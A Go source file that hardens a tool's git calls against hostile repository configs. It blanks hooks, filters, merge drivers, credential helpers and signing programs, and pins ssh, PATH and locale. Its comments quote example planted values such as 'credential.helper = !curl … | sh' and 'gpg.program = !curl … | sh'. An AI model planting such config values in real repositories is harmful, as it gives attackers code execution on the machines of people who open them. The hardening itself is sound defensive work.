// Copyright (C) 2026 Marcel W. Wysocki
// SPDX-License-Identifier: AGPL-3.0-or-later

package gitx

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"syscall"
	"time"

	"github.com/maci0/gauntlet/internal/runx"
)

// safeConfig disables every config value git will execute as a program during
// ordinary read-only commands. A hostile target repo's .git/config (an
// unpacked archive can carry one) would otherwise run arbitrary code in this
// process, with the user's privileges, before any agent starts.
var safeConfig = []string{
	"-c", "core.fsmonitor=",
	"-c", "core.hooksPath=/dev/null",
	"-c", "core.pager=cat",
	"-c", "diff.external=",
	"-c", "core.gitProxy=",
	// An ext:: remote is a command line: fetching from one executes it. No
	// gauntlet operation needs transport helpers, so a hostile repo config or
	// remote URL shaped that way is refused instead of run.
	"-c", "protocol.ext.allow=never",
}

// waitGrace is how long Run may outlive its process before the output pipes
// are closed out from under whoever still holds them. A grandchild git spawned
// (a merge driver, a signing program, a credential helper) inherits those
// pipes, and without this bound one lingering child parks Run, and with it
// the mutexes around Sample, Merge, and the worktree calls, forever past the
// deadline. It is runx.WaitGrace, the bound every git child gets, since one
// lingering helper is the same failure whichever command spawned it; a var
// only so tests can shrink it.
var waitGrace = runx.WaitGrace

// How long one git command may take, by what it has to do. A query answers
// from the index or a ref; a normal command writes one; a slow one walks the
// tree (a worktree add, a merge); a push waits on a network nobody here
// controls. Every call names one of these rather than carrying a number.
const (
	gitQuick  = 10 * time.Second
	gitNormal = 60 * time.Second
	gitSlow   = 120 * time.Second
	gitPush   = 300 * time.Second
)

func (r *Repo) run(ctx context.Context, timeout time.Duration, args ...string) ([]byte, error) {
	return r.runIn(ctx, nil, timeout, args...)
}

// runIn executes one git command with the safe config applied. stdin, when
// non-nil, is wired to the command's standard input (check-ignore reads its
// path list that way); nil keeps git's stdin closed.
func (r *Repo) runIn(ctx context.Context, stdin io.Reader, timeout time.Duration, args ...string) ([]byte, error) {
	return r.execGit(ctx, stdin, timeout, r.argv(args)...)
}

// argv is the full git argument list: the per-repo overlay, then the static
// safe config, then the caller's command. Overlay first so a later -c in
// args (tests that re-enable a hook) still wins, keeping the "last -c wins"
// contract for every layer.
func (r *Repo) argv(args []string) []string {
	extra := r.extraSafeConfig()
	out := make([]string, 0, len(extra)+len(safeConfig)+len(args))
	out = append(out, extra...)
	out = append(out, safeConfig...)
	return append(out, args...)
}

// extraSafeConfig returns the per-repo -c flags, recomputing them whenever the
// config they were derived from has changed: the repository's own, or one of
// the system and global files it was layered over.
func (r *Repo) extraSafeConfig() []string {
	if r == nil {
		return nil
	}
	r.safeMu.Lock()
	defer r.safeMu.Unlock()
	return r.extraSafeConfigLocked()
}

// buildExtraSafe must run with safeMu held and must not call extraSafeConfig:
// it bootstraps through execGit with only the static safeConfig. It also
// records which config file it read, so the caller can tell a stale overlay
// from a current one.
func (r *Repo) buildExtraSafe() []string {
	var extra []string
	r.safeConfig = r.localConfigPath()
	r.safeWatched = nil
	out, err := r.execGit(context.Background(), bytes.NewReader(nil), gitQuick,
		staticArgv("hash-object", "-t", "tree", "--stdin")...)
	if err == nil {
		if oid := strings.TrimSpace(string(out)); isHex(oid) {
			// attr.tree=empty disables in-tree .gitattributes: smudge filters
			// and merge drivers named there cannot run. Git 2.40+; older git
			// ignores the unknown key and the local-config blanks below cover
			// it. The empty-tree object is well-known and needs no -w.
			extra = append(extra, "-c", "attr.tree="+oid)
		}
	}
	list, err := r.execGit(context.Background(), nil, gitQuick,
		staticArgv("config", "--local", "--list")...)
	if err == nil {
		extra = append(extra, disableLocalDrivers(string(list))...)
		// Last, so the operator's own helpers follow the reset the local
		// listing asked for: git reads credential.helper as a list, and the
		// empty value resets it, so anything appended after is what survives.
		extra = append(extra, r.operatorCredentialHelpers(string(list))...)
	}
	return extra
}

// operatorCredentialHelpers resets git's credential helper list when the local
// config named one, and puts the operator's own system and global helpers back
// behind the reset.
//
// A helper whose value begins with "!" is a shell command git runs itself, so
// a reviewed repository carrying `credential.helper = !curl … | sh` in its
// .git/config gets code execution the first time a run pushes over https: the
// same class of planted driver as a smudge filter, and this overlay blanks
// those. An empty credential.helper is what resets the list, and it is also
// what would silently drop `gh auth setup-git` and the macOS keychain along
// with the planted entry, so the system and global helpers are read back and
// re-asserted after it. They are the operator's own configuration, not the
// reviewed tree's, and they travel as exec arguments rather than through a
// shell. A local config with no helper in it is left alone.
func (r *Repo) operatorCredentialHelpers(localListing string) []string {
	if !configHas(localListing, "credential.helper") {
		return nil
	}
	out := []string{"-c", "credential.helper="}
	for _, scope := range []string{"--system", "--global"} {
		list, err := r.execGit(context.Background(), nil, gitQuick,
			staticArgv("config", scope, "--list", "--show-origin")...)
		if err != nil {
			continue // no file at that scope, or git refused to read it
		}
		values, files := credentialHelperValues(string(list))
		out = append(out, values...)
		// The overlay now carries these files' values, so they are part of
		// what it is derived from and belong in its stamp.
		for _, f := range files {
			r.safeWatched = append(r.safeWatched, watchedConfig{path: f, stamp: stampConfig(f)})
		}
	}
	return out
}

// credentialHelperValues picks the helper assignments out of one config
// listing, in the order git reads them, so the reset can be followed by the
// operator's own chain. It also returns the config files the listing was read
// from, which the overlay's stamp has to watch: a helper the operator has
// since removed from their global config would otherwise stay asserted into
// every git call for the rest of the run.
//
// The listing is read with --show-origin, so each line carries the file it
// came from and an included file's own origin. A line without an origin is
// still read, and names no file to watch.
func credentialHelperValues(listing string) (values, files []string) {
	seen := map[string]bool{}
	for line := range strings.SplitSeq(listing, "\n") {
		line = strings.TrimSpace(line)
		origin, body := "", line
		if i := strings.IndexByte(line, '\t'); i >= 0 {
			origin, body = line[:i], strings.TrimSpace(line[i+1:])
		}
		key, value, ok := strings.Cut(body, "=")
		if !ok || !strings.EqualFold(key, "credential.helper") {
			continue
		}
		if p, isFile := originFile(origin); isFile && !seen[p] {
			seen[p] = true
			files = append(files, p)
		}
		values = append(values, "-c", "credential.helper="+value)
	}
	return values, files
}

// originFile is the config file a --show-origin line names, and whether it
// named one. The other origins are the command line and the environment,
// which are not files and so cannot be watched for a change.
func originFile(origin string) (string, bool) {
	p, ok := strings.CutPrefix(origin, "file:")
	if !ok || p == "" {
		return "", false
	}
	return p, true
}

// configHas reports whether a `git config --list` listing carries key. The
// comparison folds case because git's own section and variable names do.
func configHas(listing, key string) bool {
	for line := range strings.SplitSeq(listing, "\n") {
		if k, _, ok := strings.Cut(strings.TrimSpace(line), "="); ok && strings.EqualFold(k, key) {
			return true
		}
	}
	return false
}

// localConfigPath is the file `git config --local` reads, which is what the
// overlay above blanks drivers from. It is resolved once per rebuild and
// stat-ed on every git call, so the cost is one lstat rather than a second
// subprocess. Outside a repository git refuses the query and the answer is
// "", which stamps as the zero value: there is no config to watch.
func (r *Repo) localConfigPath() string {
	out, err := r.execGit(context.Background(), nil, gitQuick,
		staticArgv("rev-parse", "--absolute-git-dir")...)
	if err != nil {
		return ""
	}
	dir := strings.TrimSpace(string(out))
	if dir == "" {
		return ""
	}
	return filepath.Join(dir, "config")
}

// staticArgv is the static safeConfig followed by args, on a fresh slice so a
// caller cannot append into safeConfig's own array.
func staticArgv(args ...string) []string {
	return append(slices.Clone(safeConfig), args...)
}

// disableLocalDrivers blanks every local config key that names a program git
// would exec from .gitattributes or during a checkout/merge/diff. attr.tree
// already stops attributes from selecting them on git 2.40+; this is the
// fallback for older git, and covers a driver that config would invoke
// without an attribute (core.editor, gitProxy). credential.helper is here for
// the same reason: its "!" form is a shell command git runs on the next
// https push. operatorCredentialHelpers is what puts the operator's own
// helpers back behind the blank. The signing program and the toggles that
// reach for it are here for the same reason again: signing is the one exec a
// reviewed config triggers with no attribute file involved, and it fires on
// the commit every review makes.
func disableLocalDrivers(listing string) []string {
	var extra []string
	for line := range strings.SplitSeq(listing, "\n") {
		key, _, ok := strings.Cut(strings.TrimSpace(line), "=")
		if !ok || key == "" {
			continue
		}
		switch {
		case isFilterCommand(key), isMergeDriver(key), isDiffHelper(key),
			isSignProgram(key),
			strings.EqualFold(key, "credential.helper"),
			strings.EqualFold(key, "core.gitproxy"),
			strings.EqualFold(key, "interactive.difffilter"),
			strings.EqualFold(key, "core.editor"),
			strings.EqualFold(key, "sequence.editor"),
			strings.EqualFold(key, "core.askpass"):
			extra = append(extra, "-c", key+"=")
		case isSignToggle(key), strings.HasPrefix(key, "filter.") && strings.HasSuffix(key, ".required"):
			extra = append(extra, "-c", key+"=false")
		}
	}
	return extra
}

func isFilterCommand(key string) bool {
	return strings.HasPrefix(key, "filter.") &&
		(strings.HasSuffix(key, ".smudge") ||
			strings.HasSuffix(key, ".clean") ||
			strings.HasSuffix(key, ".process"))
}

func isMergeDriver(key string) bool {
	return strings.HasPrefix(key, "merge.") && strings.HasSuffix(key, ".driver")
}

func isDiffHelper(key string) bool {
	if !strings.HasPrefix(key, "diff.") {
		return false
	}
	return strings.HasSuffix(key, ".textconv") ||
		strings.HasSuffix(key, ".command") ||
		strings.HasSuffix(key, ".cmd")
}

// isSignProgram matches the config key naming the program git signs with:
// gpg.program, and the variant spellings it resolves through, gpg.ssh.program
// among them. It is the one exec a reviewed repository could reach without
// an attribute file, because signing needs nothing from the working tree: a
// repo carrying `gpg.program = !curl … | sh` beside `commit.gpgSign = true`
// ran that shell on the first commit a review made, in the lane worktrees at
// worktree.go:540 and trailers.go:90, before any agent was consulted. The
// blanking is local to the reviewed config, so an operator who signs their own
// commits through their global gpg.program still does.
func isSignProgram(key string) bool {
	return strings.HasPrefix(key, "gpg.") && strings.HasSuffix(key, ".program")
}

// isSignToggle matches the config keys that make git reach for a signing
// program at all. Without one of them set, gpg.program is a string git never
// reads, so blanking it alone would already close the exec; forcing the
// toggles off as well is what stops the reviewed config from choosing which
// key the operator's own program signs with, and what keeps a signing failure
// from becoming a way to fail every commit a review makes. A review's commits
// are written by this tool, not by the operator, so a repository that asks for
// them to be signed does not get them.
func isSignToggle(key string) bool {
	switch {
	case strings.EqualFold(key, "commit.gpgsign"),
		strings.EqualFold(key, "tag.gpgsign"),
		strings.EqualFold(key, "push.gpgsign"):
		return true
	}
	return false
}

func (r *Repo) execGit(ctx context.Context, stdin io.Reader, timeout time.Duration, args ...string) ([]byte, error) {
	return r.execGitEnv(ctx, stdin, nil, timeout, args...)
}

func (r *Repo) execGitEnv(ctx context.Context, stdin io.Reader, extraEnv []string, timeout time.Duration, args ...string) ([]byte, error) {
	g := gitPath()
	if g == "" {
		return nil, exec.ErrNotFound
	}
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, g, args...)
	if r != nil {
		cmd.Dir = r.Dir
	}
	cmd.Stdin = stdin
	// core.sshCommand is executed for every ssh fetch, ls-remote, and push,
	// and a reviewed repository's own .git/config can set it. The environment
	// variable outranks every config scope, so exporting plain ssh neutralizes
	// a repo-local command while a value the user exported themselves is kept.
	//
	// PATH is the same absolute-only list runx.LookPath uses: GIT_SSH_COMMAND=ssh
	// looks up ssh on PATH, and a relative entry (notably ".") would pick up
	// a planted executable in the reviewed tree.
	cmd.Env = mergeGitEnv(extraEnv)
	// The deadline kill takes the whole process group down, not just the git
	// pid: git's own children (a hook, a merge driver) must not survive it as
	// orphans. WaitDelay then bounds the wait on the output pipes such a
	// child would still hold open. The same rules runProc and runIndexer
	// enforce on their own children.
	out, errBuf := runx.Bound(cmd, gitOutputMax, waitGrace)
	defer runx.KillGroup(cmd, syscall.SIGKILL)
	err := runx.Outcome(ctx, cmd.Run())
	if err != nil {
		// Git explains itself on stderr; dropping it turns every failure into
		// a bare exit status that says nothing about the cause. Userinfo and
		// credentials are stripped first: a remote stored as
		// https://user:pass@host/... is otherwise echoed verbatim into the
		// error the runner prints and journals, and so is the token in the
		// query or path of a remote an agent (steered by reviewed-repo
		// content) set, or the one an operator's credential helper or ssh
		// prints. RedactUserinfo only covers the scheme://user:pass@ spelling,
		// so both passes run, which is what every other child-output-to-error
		// path in the tree already does through runx.FirstLine.
		if msg := runx.RedactSecrets(runx.RedactUserinfo(strings.TrimSpace(errBuf.String()))); msg != "" {
			return out.Bytes(), fmt.Errorf("%w: %s", err, msg)
		}
	}
	if out.Hit || errBuf.Hit {
		if err == nil {
			err = fmt.Errorf("git output exceeded %d bytes", gitOutputMax)
		}
	}
	return out.Bytes(), err
}

// gitOutputMax bounds stdout and stderr of one git command. Listings and
// short answers live far below this; a hostile tree or a runaway hook must
// not fill RAM. A var so tests can shrink it; production always sees this.
var gitOutputMax = 32 << 20

// gitLocale pins git's messages to the C locale. Git translates its own
// output, and the runner puts that output in the journal, in an event's Text,
// and in the error a failed review reports, so a machine set to a translated
// locale records different bytes for the same run than a CI machine does and
// a replayed seed no longer diffs cleanly. LC_ALL outranks LANG and
// LC_MESSAGES, so the one variable is enough and none of them have to be
// dropped. The pin is also load-bearing for the counts rather than tidiness:
// parseShortstat reads English "N insertion(s)" out of `git diff --shortstat`,
// and a translated git reports zero changed lines for a review that changed
// thousands. Paths stay byte-exact either way: core.quotepath decides that,
// and it is not the locale.
const gitLocale = "LC_ALL=C"

// gitEnv is os.Environ with cwd-relative PATH entries dropped, the locale
// pinned, and, unless the operator already exported a non-empty one,
// GIT_SSH_COMMAND=ssh. Git's own helpers (ssh, a credential helper, diffie)
// inherit this, so a planted ./ssh cannot run.
func gitEnv() []string {
	extra := []string{gitLocale}
	if strings.TrimSpace(os.Getenv("GIT_SSH_COMMAND")) == "" {
		extra = append(extra, "GIT_SSH_COMMAND=ssh")
	}
	return overlayEnv(runx.AbsPATHEnv(), extra)
}

// mergeGitEnv overlays extra KEY=value pairs on gitEnv, replacing any
// existing entry for the same key. GIT_INDEX_FILE is how Snapshot points
// git at a private index without touching the real one; getenv returns the
// first match, so appending would not win over a caller-exported value.
func mergeGitEnv(extra []string) []string {
	if len(extra) == 0 {
		return gitEnv()
	}
	return overlayEnv(gitEnv(), extra)
}

// overlayEnv returns env with every entry for a key in extra replaced by
// extra's own value, appended where env carries none.
func overlayEnv(env, extra []string) []string {
	if len(extra) == 0 {
		return env
	}
	drop := make(map[string]struct{}, len(extra))
	for _, kv := range extra {
		key, _, _ := strings.Cut(kv, "=")
		drop[key] = struct{}{}
	}
	out := make([]string, 0, len(env)+len(extra))
	for _, kv := range env {
		key, _, _ := strings.Cut(kv, "=")
		if _, ok := drop[key]; ok {
			continue
		}
		out = append(out, kv)
	}
	return append(out, extra...)
}

// extraSafeConfigLocked is extraSafeConfig for a caller already holding
// safeMu, and for a handle that has inherited another one's overlay.
func (r *Repo) extraSafeConfigLocked() []string {
	if !r.safeReady || r.safeStamp != stampConfig(r.safeConfig) || r.safeWatchedStale() {
		r.extraSafe = r.buildExtraSafe()
		r.safeReady = true
		r.safeStamp = stampConfig(r.safeConfig)
	}
	return r.extraSafe
}

// safeWatchedStale reports whether a config outside the repository that the
// overlay copied values from has changed since the overlay was built.
func (r *Repo) safeWatchedStale() bool {
	for _, w := range r.safeWatched {
		if w.stamp != stampConfig(w.path) {
			return true
		}
	}
	return false
}
